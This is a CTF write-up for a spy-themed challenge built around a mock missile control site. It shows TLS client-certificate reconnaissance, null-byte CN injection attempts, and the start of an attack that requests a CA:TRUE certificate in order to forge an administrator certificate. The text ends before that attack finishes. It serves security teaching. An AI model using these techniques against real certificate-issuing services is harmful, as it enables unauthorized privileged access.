# Challenge #2
Solved together with YaakovCohen88

## Description
> Hello again, Agent.
> 
> Our team has successfully exfiltrated the intel contained in the safe.
> 
> The intel has pointed us to an anti aircraft weapon deployed by the terrorists in order to shoot down civilian aircraft.
> 
> While our field teams try to find the weapon, you must work to disable it remotely.
> 
> Good luck!
>  M.|

A link to a website was attached.

## Solution

We visit the website at `http://missilesys.com/` and get a redirection to an HTTPS version:
```console
root@kali:/media/sf_CTFs/mossad/2# curl http://missilesys.com/ -v
*   Trying 35.246.158.51...
* TCP_NODELAY set
* Connected to missilesys.com (35.246.158.51) port 80 (#0)
> GET / HTTP/1.1
> Host: missilesys.com
> User-Agent: curl/7.61.0
> Accept: */*
>
< HTTP/1.1 302 Moved Temporarily
< Server: nginx/1.14.0 (Ubuntu)
< Date: Sun, 12 May 2019 17:32:53 GMT
< Content-Type: text/html
< Content-Length: 170
< Connection: keep-alive
< Location: https://missilesys.com/
<
<html>
<head><title>302 Found</title></head>
<body bgcolor="white">
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>
* Connection #0 to host missilesys.com left intact
```

The HTTPS website is not backed by a known certificate chain:
```console
root@kali:/media/sf_CTFs/mossad/2# curl https://missilesys.com/
curl: (60) SSL certificate problem: unable to get local issuer certificate
More details here: https://curl.haxx.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the web page mentioned above.
```

If we check the certificate chain details, we get the following certificate:
```console
root@kali:/media/sf_CTFs/mossad/2# nmap -p 443 --script ssl-cert missilesys.com
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-12 20:37 IDT
Nmap scan report for missilesys.com (35.246.158.51)
Host is up (0.0098s latency).
rDNS record for 35.246.158.51: 51.158.246.35.bc.googleusercontent.com

PORT    STATE SERVICE
443/tcp open  https
| ssl-cert: Subject: commonName=missilesys.com
| Subject Alternative Name: DNS:missilesys.com, IP Address:35.198.135.201
| Issuer: organizationName=International Weapons Export Inc.
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-04-20T09:12:01
| Not valid after:  2020-04-19T09:12:01
| MD5:   b023 7df6 4040 57fb f26e 0d38 0955 874e
|_SHA-1: 4445 b350 b422 5dc7 1bcc 947c fa06 d48b 514f e580
```

The certificate is issued to `missilesys.com` by `International Weapons Export Inc.`. Since we don't have a chain from `International Weapons Export Inc.` up to some root of trust, the certificate isn't trusted.

We can add a flag to ignore our trust issues and retrieve the website anyway:

```console
root@kali:/media/sf_CTFs/mossad/2# curl https://missilesys.com/ -v -k
*   Trying 35.246.158.51...
* TCP_NODELAY set
* Connected to missilesys.com (35.246.158.51) port 443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: none
  CApath: /etc/ssl/certs
* (304) (OUT), TLS handshake, Client hello (1):
* (304) (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Request CERT (13):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Certificate (11):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Client hello (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
* ALPN, server accepted to use http/1.1
* Server certificate:
*  subject: CN=missilesys.com
*  start date: Apr 20 09:12:01 2019 GMT
*  expire date: Apr 19 09:12:01 2020 GMT
*  issuer: O=International Weapons Export Inc.
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
> GET / HTTP/1.1
> Host: missilesys.com
> User-Agent: curl/7.61.0
> Accept: */*
>
< HTTP/1.1 302 Moved Temporarily
< Server: nginx/1.14.0 (Ubuntu)
< Date: Sun, 12 May 2019 17:44:18 GMT
< Content-Type: text/html
< Content-Length: 170
< Connection: keep-alive
< Location: http://missilesys.com/notwelcome
<
<html>
<head><title>302 Found</title></head>
<body bgcolor="white">
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>
* Connection #0 to host missilesys.com left intact
```

Now we get redirected to `http://missilesys.com/notwelcome`, which contains a big red light and the text "You are not welcome here!":

```html
    <div id="title" class="level1_title">
            <span>You are not welcome here!</span>
    </div>
    <div id="notwelcome">
            <img src="http://dev.missilesys.com/images/red_light.png"></img>
    </div>
```

If we inspect the TLS handshake, we can see that the server sent us `Request CERT` - a request for a client-side certificate as part of a [mutual authenticate](https://en.wikipedia.org/wiki/Mutual_authentication) negotiation. In a mutual authentication negotiation, the server not only sends us a certificate chain in order to prove its identity but also requests a certificate chain from us in order to prove our identity. Since we don't have any client-side certificate, the server rejects our access attempt.

The image points to `http://dev.missilesys.com`, let's visit that:

![](images/dev_missle_form.png)

If we try to enter a username and password, we are redirected to the following page:

![](images/dev_missle_download.png)

With the following POST data:

```
username=user
password=pass
privatekey=-----BEGIN RSA PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQDEczI3G7Eckvvi
jq+s2ZE3JhWnlKctCMVT1koTU3tqVVk1GG1VXS0QblSGJJY6fVU/e5+HXquC55Ku
fXJsBRMv4Q0vR3PgYdYaDxyeCOs+a8lt5xm3c+vIF+8x+zxHtzT7cH5th+EXhaOQ
hOxZgRgT9dKLexyGHZlAnTyxaCYacyaqZ2Y8hs+AchzHsg54q0nKEvg2see5W2kr
kM+5QuS7eaRGgVSbtb4ZS27zZtxV6G5BmccOKPfm31DICfiS5mvP3GY+n7wJfG4Z
4u7GYLLRddIolbtwimqd/buDd0Hs4kUJ01ZGt+EHwo7+9tlHy4S3Pq5AsdAU1cNU
TwnRhCxXAgMBAAECggEAHPwYJRxfWeVv56IA1oJ1VAs497RNpC3em3uLC2XuWCaG
lnhnrUglnX6B1xbv2WpjmQ2+4GS97n8HW9pjdv+asJ5GaTrkJG+a/NZM9R5Aw0F5
A0+tMi2W1Lt/TcMRRk2IMi8LYFLDicpscybBjoUnDc7fxTehYkJcubVZXp2MvasM
iGSeJQEIRUc41AGCPc5thiX1bQCW3fMpSpBk5Ld7Y8AFqS7ewdSk8YBxGSHF4uBN
MnoP/ctqfktTCFanW/LPaDglhew8TOSJ3xeva1zdWTHz8Ak+/2ZG/eSPoihe8Ieq
xjwcweluUwPlZkmkkGYmtbqci3XtGrcWbg24X/p9pQKBgQDpB/A+MSAIOvYuQ8sP
aUW06KlAGLowDB/1HYPM2yRlRnQ0BSelFV2prFBbs1r7TYEzD1/C4tKszI5Y5c/T
UuGqv9igTNxlAcRWO/4SU5xDqSNIbYhV0NTQjcRzV2pKHgi/Haau4rB8h9PBJgTg
CObdt2E2Lfq2Z9tcGACUzKHQTQKBgQDX0DXUEAeo4hV731nuVTT29+doRP3MBY1V
iVcJUxoqmT3K+sssHF4EI8Rm1G3PQDvqi8V8x6lCJhARxZ2vr2T31qsg5byOc8Eu
LoWoHoQv4XRAGp9JW6KHiiPFMchKDiKm+qwoXPEbjJ8rZ7yrjb5GIXCtD5eKVhho
qVb75AThMwKBgErhPSaO3I8oeyDEsgRivH50YKZzC6kSzFYURNzX8isE56Qrn+Ch
K/awoyXETVEBR6njn87c2fuiw373Yb+zG0al3PMtn4hpd/CJ2IuFCGqJeAf3Al8o
+qmFVIIHreThH8hhu8TonPN3Jekj0V84HQ9TtM4XGj/wwYEnSVCHLNvlAoGAB096
Q1C3sbTW3XdXaIdiX+tN325W2o5llzwrwpkaDc9bFIEiWMAtPx6nDISto5Odc/iA
HBX3WdJIQRHcoZLjbLHM4jRmCr1JEfNpe6Rs/eI5OeKs+qMsAkNfqtJg4oFQEy/y
nPto/3HoAmRlM7p9c4q2cmZQz9LSyNjTpXy33ZkCgYAuBjuiB1MXJ23SaSmHi+Ry
x67ye57qtzJBjjNhAvWFfViRwZhEmY71OkOKkjlydpvGEiGvT1v9o+1xWmVflBwY
2AYjQGYeQDxUxGq09sY0i0z4ymbMvb6N+WWq+fbgAEADbDROjdQzjn3cuXexeN2m
ZFv8fZE8JWUCLf2HRxOC0Q==
-----END RSA PRIVATE KEY-----

csr=-----BEGIN CERTIFICATE REQUEST-----
MIICgjCCAWwCAQAwDzENMAsGA1UEAwwEdXNlcjCCASIwDQYJKoZIhvcNAQEBBQAD
ggEPADCCAQoCggEBAMRzMjcbsRyS++KOr6zZkTcmFaeUpy0IxVPWShNTe2pVWTUY
bVVdLRBuVIYkljp9VT97n4deq4Lnkq59cmwFEy/hDS9Hc+Bh1hoPHJ4I6z5ryW3n
Gbdz68gX7zH7PEe3NPtwfm2H4ReFo5CE7FmBGBP10ot7HIYdmUCdPLFoJhpzJqpn
ZjyGz4ByHMeyDnirScoS+Dax57lbaSuQz7lC5Lt5pEaBVJu1vhlLbvNm3FXobkGZ
xw4o9+bfUMgJ+JLma8/cZj6fvAl8bhni7sZgstF10iiVu3CKap39u4N3QeziRQnT
Vka34QfCjv722UfLhLc+rkCx0BTVw1RPCdGELFcCAwEAAaAwMC4GCSqGSIb3DQEJ
DjEhMB8wHQYDVR0OBBYEFG0tZEZsdBat7bYForQa3Jsm4zwKMAsGCSqGSIb3DQEB
BQOCAQEAhnbp1ZhMINpDVAtknky0pAHd6x7r0FaJmo2QxRMWp49BCdPV6GLS4JTl
eNSz3uz8+iNPwTCqWTleFbA7OsnX1pYPeMGiHJKhPLHg+Tlfm3ozXc1jfskDXUJ7
GuCaHJnUf4FubjgTVkKL2Q5sZt7EWP3PIbw8x5ZMUVGCQatde9bLTf+1sMxZ5SJm
A3r3eYXSKgEXE/ePInelL4QPU7fNuK5+5AVdvuiIeBNOI6K5piqJPQPFZIEf1l6+
d7HAgUB37mZ0NCLMuO6kO+CocCKDX1PH+cXW1nee1YM8vKZpEdb1QbI3Qwci3q4P
CT1xF5tdlF0mg6nEQp89gAAy/aS61w==
-----END CERTIFICATE REQUEST-----
```

As you can see, in addition to our username and password, the form included two hidden fields for a private RSA key and a certificate signing request.

Let's inspect the CSR (certificate signing request) by copying it to a file and running the following command:

```console
root@kali:/media/sf_CTFs/mossad/2# openssl req -in user.csr -text -noout
Certificate Request:
    Data:
        Version: 1 (0x0)
        Subject: CN = user
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    00:c4:73:32:37:1b:b1:1c:92:fb:e2:8e:af:ac:d9:
                    91:37:26:15:a7:94:a7:2d:08:c5:53:d6:4a:13:53:
                    7b:6a:55:59:35:18:6d:55:5d:2d:10:6e:54:86:24:
                    96:3a:7d:55:3f:7b:9f:87:5e:ab:82:e7:92:ae:7d:
                    72:6c:05:13:2f:e1:0d:2f:47:73:e0:61:d6:1a:0f:
                    1c:9e:08:eb:3e:6b:c9:6d:e7:19:b7:73:eb:c8:17:
                    ef:31:fb:3c:47:b7:34:fb:70:7e:6d:87:e1:17:85:
                    a3:90:84:ec:59:81:18:13:f5:d2:8b:7b:1c:86:1d:
                    99:40:9d:3c:b1:68:26:1a:73:26:aa:67:66:3c:86:
                    cf:80:72:1c:c7:b2:0e:78:ab:49:ca:12:f8:36:b1:
                    e7:b9:5b:69:2b:90:cf:b9:42:e4:bb:79:a4:46:81:
                    54:9b:b5:be:19:4b:6e:f3:66:dc:55:e8:6e:41:99:
                    c7:0e:28:f7:e6:df:50:c8:09:f8:92:e6:6b:cf:dc:
                    66:3e:9f:bc:09:7c:6e:19:e2:ee:c6:60:b2:d1:75:
                    d2:28:95:bb:70:8a:6a:9d:fd:bb:83:77:41:ec:e2:
                    45:09:d3:56:46:b7:e1:07:c2:8e:fe:f6:d9:47:cb:
                    84:b7:3e:ae:40:b1:d0:14:d5:c3:54:4f:09:d1:84:
                    2c:57
                Exponent: 65537 (0x10001)
        Attributes:
        Requested Extensions:
            X509v3 Subject Key Identifier:
                6D:2D:64:46:6C:74:16:AD:ED:B6:05:A2:B4:1A:DC:9B:26:E3:3C:0A
    Signature Algorithm: sha1WithRSAEncryption
         86:76:e9:d5:98:4c:20:da:43:54:0b:64:9e:4c:b4:a4:01:dd:
         eb:1e:eb:d0:56:89:9a:8d:90:c5:13:16:a7:8f:41:09:d3:d5:
         e8:62:d2:e0:94:e5:78:d4:b3:de:ec:fc:fa:23:4f:c1:30:aa:
         59:39:5e:15:b0:3b:3a:c9:d7:d6:96:0f:78:c1:a2:1c:92:a1:
         3c:b1:e0:f9:39:5f:9b:7a:33:5d:cd:63:7e:c9:03:5d:42:7b:
         1a:e0:9a:1c:99:d4:7f:81:6e:6e:38:13:56:42:8b:d9:0e:6c:
         66:de:c4:58:fd:cf:21:bc:3c:c7:96:4c:51:51:82:41:ab:5d:
         7b:d6:cb:4d:ff:b5:b0:cc:59:e5:22:66:03:7a:f7:79:85:d2:
         2a:01:17:13:f7:8f:22:77:a5:2f:84:0f:53:b7:cd:b8:ae:7e:
         e4:05:5d:be:e8:88:78:13:4e:23:a2:b9:a6:2a:89:3d:03:c5:
         64:81:1f:d6:5e:be:77:b1:c0:81:40:77:ee:66:74:34:22:cc:
         b8:ee:a4:3b:e0:a8:70:22:83:5f:53:c7:f9:c5:d6:d6:77:9e:
         d5:83:3c:bc:a6:69:11:d6:f5:41:b2:37:43:07:22:de:ae:0f:
         09:3d:71:17:9b:5d:94:5d:26:83:a9:c4:42:9f:3d:80:00:32:
         fd:a4:ba:d7
```

The main detail here is that the certificate is being issued in order to authenticate `user` (which is the username we entered).

By inspecting the form source, we can see that these additional fields were generated by a script upon form submission:

```html
<form method="post">
    <div id="username">
        <span>Username:</span>
        <input name="username" type="text"></input>
    </div>
    <div id="password">
        <div>Password:</div>
        <input name="password" type="password"></input>
    </div>
    <div id="submit">
        <input id="privatekey" name="privatekey" type="hidden"></input>
        <input id="csr" name="csr" type="hidden"></input>
        <input type="button" onclick="gencsr()" value="Submit"></input>	
    </div>
</form>
```

`gencsr()` is implemented in a javascript file included by the page. This file seems to be based on the [PKI.js](https://github.com/PeculiarVentures/PKI.js) library, with some custom code:
```javascript
function gencsr() {
	createPKCS10(document.querySelector("#username input").value);
}

function createPKCS10(cn) {
    return Promise.resolve().then(() => createPKCS10Internal(cn)).then(() => {
        var resultString = "-----BEGIN CERTIFICATE REQUEST-----\r\n";
        resultString = `${resultString}${formatPEM(toBase64(arrayBufferToString(pkcs10Buffer)))}`;
        resultString = `${resultString}\r\n-----END CERTIFICATE REQUEST-----\r\n`;
        
        document.getElementById("csr").value = resultString;
        document.getElementById("privatekey").value = window.privateKey;
        document.querySelector("#signup form").submit();
    });
}
```

The custom code seems to generate a private key, and create a CSR with our selected username as the CN.

If we click the "Download" link, we get to download a file called `user.p12`. This is a [PKCS #12](https://en.wikipedia.org/wiki/PKCS_12) file:

> In cryptography, PKCS #12 defines an archive file format for storing many cryptography objects as a single file. It is commonly used to bundle a private key with its X.509 certificate or to bundle all the members of a chain of trust. 

Let's inspect it:

```console
root@kali:/media/sf_CTFs/mossad/2# openssl pkcs12 -info -in user.p12
Enter Import Password:
MAC: sha1, Iteration 2048
MAC length: 20, salt length: 8
PKCS7 Encrypted data: pbeWithSHA1And40BitRC2-CBC, Iteration 2048
Certificate bag
Bag Attributes
    localKeyID: A0 AE D7 F1 54 72 79 71 D8 04 6E 0C E7 69 5A CD 07 C5 3F 1D
subject=CN = user

issuer=O = International Weapons Export Inc.

-----BEGIN CERTIFICATE-----
MIIC4jCCAcqgAwIBAgIBATANBgkqhkiG9w0BAQsFADAsMSowKAYDVQQKDCFJbnRl
cm5hdGlvbmFsIFdlYXBvbnMgRXhwb3J0IEluYy4wHhcNMTkwNTEyMTgwMDQxWhcN
MjAwNTExMTgwMDQxWjAPMQ0wCwYDVQQDDAR1c2VyMIIBIjANBgkqhkiG9w0BAQEF
AAOCAQ8AMIIBCgKCAQEAxHMyNxuxHJL74o6vrNmRNyYVp5SnLQjFU9ZKE1N7alVZ
NRhtVV0tEG5UhiSWOn1VP3ufh16rgueSrn1ybAUTL+ENL0dz4GHWGg8cngjrPmvJ
becZt3PryBfvMfs8R7c0+3B+bYfhF4WjkITsWYEYE/XSi3schh2ZQJ08sWgmGnMm
qmdmPIbPgHIcx7IOeKtJyhL4NrHnuVtpK5DPuULku3mkRoFUm7W+GUtu82bcVehu
QZnHDij35t9QyAn4kuZrz9xmPp+8CXxuGeLuxmCy0XXSKJW7cIpqnf27g3dB7OJF
CdNWRrfhB8KO/vbZR8uEtz6uQLHQFNXDVE8J0YQsVwIDAQABoywwKjAJBgNVHRME
AjAAMB0GA1UdDgQWBBRtLWRGbHQWre22BaK0GtybJuM8CjANBgkqhkiG9w0BAQsF
AAOCAQEAK53ccwjm0BSOdgFhrKH8YUnsH2T6mFBt4x3oidVuS3HyVHSnCsLVKAiU
FuuGKq2SbHIrEQwwdoI5Lnw5OeXEzsGpvzEGKFs5QaABCRflg1lOsQimc8ciTZ1r
BY8EpC2YTmV9b837PU6/C3mvDEc74AywYp/EKS+4pEsIn/XVDCQ5DuOqKkhF2BAE
Hzm5n7nsGf2oEBq/YkquQ1AX1yZtyrWBAQQxTJAx/+Fl3Rnd//pfgc9YA+xDqPd+
SmJMNDA84VTrU2TtNRzkhw5BND5SCbXjHJhaAIpemwt+fZCFLVARvWvDNq/9w/UZ
eH+uSIgT06HgYluFm27oowwYNlouDw==
-----END CERTIFICATE-----
Certificate bag
Bag Attributes: <No Attributes>
subject=O = International Weapons Export Inc.

issuer=O = International Weapons Export Inc.

-----BEGIN CERTIFICATE-----
MIIDLjCCAhagAwIBAgIJAIfwMMwTXISVMA0GCSqGSIb3DQEBCwUAMCwxKjAoBgNV
BAoMIUludGVybmF0aW9uYWwgV2VhcG9ucyBFeHBvcnQgSW5jLjAeFw0xOTA0MjAw
OTEyMDFaFw0xOTA1MjAwOTEyMDFaMCwxKjAoBgNVBAoMIUludGVybmF0aW9uYWwg
V2VhcG9ucyBFeHBvcnQgSW5jLjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
ggEBALXZVC+c1A/4E8dVtZXOAGB4P5lX6zq/OtHa7mUruvVXTlmRiQxrP582C/9D
yVx3n8FeR6TAcRtQIDHeQtbcovKD7m6QaZD2xh+liNkwnATU0XEc/eg04KUbu8m2
hbLDtPUwjSNqcEgs+KC3MQDXlOwhLAO0K6x4j6dAniEDlev3H7C+PcCcBSepYRyW
Hs0NM+VW+69mMEGD0uHW14i3GhAxzJ40jQe30/EO9zdylVpWdpWlzVTw3sLU/7EV
aPc/SfIehOeZ7hRiB1B3dy5KFu7LamusHoYduCjqwY2435ODZtxdJ4x+u7PKv3eb
XRbcObYA10OkXFprvdigVTak7P8CAwEAAaNTMFEwHQYDVR0OBBYEFGRYGlEuaMZ+
hClg+aeMsSF2+PSoMB8GA1UdIwQYMBaAFGRYGlEuaMZ+hClg+aeMsSF2+PSoMA8G
A1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAIDUDzQlEh97jzRkMNds
TWEo2xiwYOspmbloiq1MV/uFG+CkgeE8/OeizsKPGlGmlxeJ0wfVGrPf0hSBISDV
Bf2xN3QV9yHVtoJBr8hNyQN5Mvkl7q54TjrRvVhK4RWzSfnKzpV1btE9aEUmGpXH
E9CI5sVx7FFMHQiXmuO3C1nXTV/gFUxGtpJE01xeD4xtfPM4yx6FWiGB1kdC8TsF
0HcE9pc2yWO/+C1YzVe+Zd0miCAXebh8g51PlAJhLJBLizQJFKg8jSGyDquhSPPq
bzWmsTg7gC4p3zELjQmQZe7H7qwa5DmNLovrOhzLOhFh0fBx3210HbqDPw7TNW8h
Cco=
-----END CERTIFICATE-----
PKCS7 Data
Shrouded Keybag: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration 2048
Bag Attributes
    localKeyID: A0 AE D7 F1 54 72 79 71 D8 04 6E 0C E7 69 5A CD 07 C5 3F 1D
Key Attributes: <No Attributes>
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFHDBOBgkqhkiG9w0BBQ0wQTApBgkqhkiG9w0BBQwwHAQIekaYQxMj9iwCAggA
MAwGCCqGSIb3DQIJBQAwFAYIKoZIhvcNAwcECBsX2X0EXQE+BIIEyEJHWDFVQw1t
Wglw0fePUq3+9IWLTBwmYH1z3DmW5IoLBnbdLjdFIfI3UpEpZCAWCvX6f7XmVtI3
F2RtbJ5ThdWa+QbF+1jd98//j0nxnzxOnhIO15JdTwKTR+e0Kn9jDEXvpNr+Pc/C
38pu3QHdGp0eOr5zs0H4/mrUviUQx9QfGNgj19XFhtn4NWEF8h4r9AH/cHpVDrN2
zhoOsco6W7q2oxmB8A1w4NrifuUCovCiK4eFPmzBX+H0zYUZ0JFaigHOLOXpZuXh
r5QRw37+Mlon/5LhGLP7D00Libu3ozksaY/3mqCnwz9YrAuA5wKcqe1fwJG2LhTO
Ijb1uKqORtLVKV2xeacML0U+XZFryBF1z9pR0M0InNWtgHj/O2fwKvRLR7vVJCuK
Jay5VTWNp5NqeD8M4ZsQWQL9f0thsvV0Ouh/wAFEcQ4DQGk1omXeiSn3cWKV7T+3
9p2aIZiEGVRKiDb3Z0PVUzXgMuMnr7ErMPhAIRdbXDIbkkg5eqHVhw1U9nmFpZPk
IUccpUQxztM8zipKuSrVMsaaP4jI64unNuNbHgV4UtYHz6KFNee/Y0L2DCnzdLMt
437BttCC85TSf1Vsb02lZoiPcTEjq2/jKzXOBH1RMVM9OGwDFkU85T4IOxT8KQM8
+Uk2+mD4fpnOcXYZTkatMm3F/U/d5Hzmwe8BbBuVFzYMlkG4UvExa1/GAYDAhTiw
QppC2E82Rv1V7IrS0l5airb3HBfPjpjX+kMiH/2QqIhjyMBITCMiVTCAYmMtvKLt
11kD+goqaW8PdsriNJxVK5ydR5j9MsdzRPmKY0hw07s0IIj8QQFF3isgQlREgEmw
nz1EE/sM7tn8j0GiEhYUxZMLqtpg65fe373Nvjd5ik4FNS+L1kHUuxb7iOHS5yEQ
JoAsidtgbzQqNM8XLZbz12th/WJE1qtYKzAxFP2MQZ4JbLvtmRDFGcH9ewVOKY5e
L2ynk3/gGzY6nHtqW1cDOGsM/U6PNKQ5ays2MY9XlDpNAo5STTuYNQquEKfugnk8
vugRcm4kLc3TCtfsSDjCVACCUm3u1e8/MeopNQ9bDFxyjrRJcUkDefdGEr7qpuMy
SmxBOHSzIUQXH7kJO2k4vW49N8af3ruO4LmrDn16IxWgq4jwfArSMsH92Afu5LmJ
+dB6txxSHBcbN4wAKXuJGsy3qwLyOL+lKFuffaidxhsjdFNeL5pe/IQfEjJ5+ED3
lVpArp0UAd5wlH6R7mzlq0YdDhJsdw25WPRC5Rpkoe10Ue0q37H5D4T6pCOQg70s
kny8fJedrVjxVdY7hYwUBXUjZSBPH0G7AWEqsYBaU5TNHizjFGEOnMVm0qhhJiPV
F0zwwdFv0VwCzYYmeYAVLbaHWuVmDoYU42kv8wBXoRYFrPuAy4QQOMvPaYbikYc6
4+3dNagvyBGIeMgg7ZEypqQMGtkuPN1fbt3c5WMaA0Hs+VFZJSJcEEjHcUQgrGqO
qPGkq9AhJPV8puHvassE0kqzSQnGUNuOsVFyV4uOIrvc4cSmn1CQjMGxW3FRbGHm
wbtEA82E9Pte/HCl0gs7EJEI6nrMV25CwgQxdnhR07hQTizeUo+aBpCHuZrwp4ud
ZndmJx9urwUzSRHY4wZVhw==
-----END ENCRYPTED PRIVATE KEY-----
```

We can see that the certificate request we sent using the form was signed by the server, and now we have what seems to be a valid certificate chain which authenticates `user` and builds up to "International Weapons Export Inc." (which is also the issuer of the server certificate which was used when attempting to access `https://missilesys.com/`).

Can we use this chain to access `http://missilesys.com`?

We add the chain to our `Personal` certificate store:

![](images/cert_store.png)

Now we try to access the website again. This time, the browser asks us which client-side certificate we'd like to use for mutual authentication:

![](images/select_certificate.png)

We chose the newly installed certificate and can finally access the control panel:

![](images/control_panel.png)

Looks serious. On the top right corner we have a "settings" link, but if we try to click it, we get an error message stating that "You are not the administrator!".

No problem, we can just head back to `http://dev.missilesys.com` and issue a certificate with `administrator` as the CN, right?

Not so easy, the server doesn't accept `administrator` as a valid name, and states that "User already exists!".

Some implementations are vulnerable to a [null prefix attack](https://moxie.org/papers/null-prefix-attacks.pdf), where we insert a null byte inside the CN and faulty implementations might stop the comparison when they hit the null byte, or ignore the null byte altogether. 

All the following attempts were signed successfully by the server, allowed accessing the main control panel, but failed when attempting to access the setting page:

```
subject=CN = admin\00istrator
subject=CN = administrator\00a
subject=CN = administrator\00
```

We have to find a different way to trick the server into signing an "administrator" certificate for us. Or is there another option?

Let's take a closer look at the certificate the server signed for us.

First we extract the certificate from the PKCS#12 file, and then inspect it:

```console
root@kali:/media/sf_CTFs/mossad/2# openssl pkcs12 -in user.p12  -clcerts -nokeys -out user.pem
Enter Import Password:
root@kali:/media/sf_CTFs/mossad/2# openssl x509 -in user.pem -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 1 (0x1)
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: O = International Weapons Export Inc.
        Validity
            Not Before: May 12 18:00:41 2019 GMT
            Not After : May 11 18:00:41 2020 GMT
        Subject: CN = user
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    00:c4:73:32:37:1b:b1:1c:92:fb:e2:8e:af:ac:d9:
                    91:37:26:15:a7:94:a7:2d:08:c5:53:d6:4a:13:53:
                    7b:6a:55:59:35:18:6d:55:5d:2d:10:6e:54:86:24:
                    96:3a:7d:55:3f:7b:9f:87:5e:ab:82:e7:92:ae:7d:
                    72:6c:05:13:2f:e1:0d:2f:47:73:e0:61:d6:1a:0f:
                    1c:9e:08:eb:3e:6b:c9:6d:e7:19:b7:73:eb:c8:17:
                    ef:31:fb:3c:47:b7:34:fb:70:7e:6d:87:e1:17:85:
                    a3:90:84:ec:59:81:18:13:f5:d2:8b:7b:1c:86:1d:
                    99:40:9d:3c:b1:68:26:1a:73:26:aa:67:66:3c:86:
                    cf:80:72:1c:c7:b2:0e:78:ab:49:ca:12:f8:36:b1:
                    e7:b9:5b:69:2b:90:cf:b9:42:e4:bb:79:a4:46:81:
                    54:9b:b5:be:19:4b:6e:f3:66:dc:55:e8:6e:41:99:
                    c7:0e:28:f7:e6:df:50:c8:09:f8:92:e6:6b:cf:dc:
                    66:3e:9f:bc:09:7c:6e:19:e2:ee:c6:60:b2:d1:75:
                    d2:28:95:bb:70:8a:6a:9d:fd:bb:83:77:41:ec:e2:
                    45:09:d3:56:46:b7:e1:07:c2:8e:fe:f6:d9:47:cb:
                    84:b7:3e:ae:40:b1:d0:14:d5:c3:54:4f:09:d1:84:
                    2c:57
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints:
                CA:FALSE
            X509v3 Subject Key Identifier:
                6D:2D:64:46:6C:74:16:AD:ED:B6:05:A2:B4:1A:DC:9B:26:E3:3C:0A
    Signature Algorithm: sha256WithRSAEncryption
         2b:9d:dc:73:08:e6:d0:14:8e:76:01:61:ac:a1:fc:61:49:ec:
         1f:64:fa:98:50:6d:e3:1d:e8:89:d5:6e:4b:71:f2:54:74:a7:
         0a:c2:d5:28:08:94:16:eb:86:2a:ad:92:6c:72:2b:11:0c:30:
         76:82:39:2e:7c:39:39:e5:c4:ce:c1:a9:bf:31:06:28:5b:39:
         41:a0:01:09:17:e5:83:59:4e:b1:08:a6:73:c7:22:4d:9d:6b:
         05:8f:04:a4:2d:98:4e:65:7d:6f:cd:fb:3d:4e:bf:0b:79:af:
         0c:47:3b:e0:0c:b0:62:9f:c4:29:2f:b8:a4:4b:08:9f:f5:d5:
         0c:24:39:0e:e3:aa:2a:48:45:d8:10:04:1f:39:b9:9f:b9:ec:
         19:fd:a8:10:1a:bf:62:4a:ae:43:50:17:d7:26:6d:ca:b5:81:
         01:04:31:4c:90:31:ff:e1:65:dd:19:dd:ff:fa:5f:81:cf:58:
         03:ec:43:a8:f7:7e:4a:62:4c:34:30:3c:e1:54:eb:53:64:ed:
         35:1c:e4:87:0e:41:34:3e:52:09:b5:e3:1c:98:5a:00:8a:5e:
         9b:0b:7e:7d:90:85:2d:50:11:bd:6b:c3:36:af:fd:c3:f5:19:
         78:7f:ae:48:88:13:d3:a1:e0:62:5b:85:9b:6e:e8:a3:0c:18:
         36:5a:2e:0f
```

What is the difference between a CA (certificate authority) certificate and a leaf certificate? The CA certificate can be used to sign other certificates, while a leaf certificate cannot. And how does the browser (or any other entity verifying the chain) know if a certificate is a leaf or not? Using the following field:
```
X509v3 Basic Constraints:
    CA:FALSE
```

If we didn't have this field, any malicious entity could purchase a legitimate certificate from a trusted CA and then use it to extend the chain by signing additional certificates. Therefore, when CAs issue certificates to end entities, they set "Basic Constraints: CA = FALSE" in the issued certificate and the browser knows not to trust a chain where any certificate but the last one has CA = FALSE.

What if we could get the server to sign a certificate with CA = TRUE? We could then sign our own certificate with CN = administrator.

We start by creating a private key for our intermediate certificate (in theory we could also use the one generated by the javascript file):
```console
root@kali:/media/sf_CTFs/mossad/2# openssl genrsa -out intermediate_key.pem 2048
Generating RSA private key, 2048 bit long modulus (2 primes)
............................................................................................................+++++
...................+++++
e is 65537 (0x010001)
```

Now, we need to issue a CSR for a certificate with CA = TRUE:

```console
root@kali:/media/sf_CTFs/mossad/2# openssl req -addext basicConstraints=critical,CA:TRUE,pathlen:1 -outform pem -out intermediate_csr.pem -key intermediate_key.pem -new
